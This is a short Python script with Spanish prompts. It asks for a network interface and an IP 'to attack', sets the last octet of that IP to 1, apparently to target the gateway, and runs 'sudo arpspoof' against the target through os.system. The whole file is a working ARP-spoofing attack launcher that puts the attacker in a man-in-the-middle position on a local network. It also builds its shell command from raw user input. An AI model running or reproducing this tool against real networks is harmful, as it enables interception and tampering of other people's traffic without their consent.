#!/usr/bin/env python3

import os
version = input("¿que red utiliza?\n")
ip = input("¿cual es la ip a atacar?\n")

def cambiar_ultima_ip(ip):
    
    partes = ip.split('.')
    
    partes[-1] = '1'
    
    
    nueva_ip = '.'.join(partes)
    return nueva_ip

ip = ip
ipmod = cambiar_ultima_ip(ip)


comando = f'sudo arpspoof -i "{version}" -t "{ip}" "{ipmod}"'

os.system(comando)
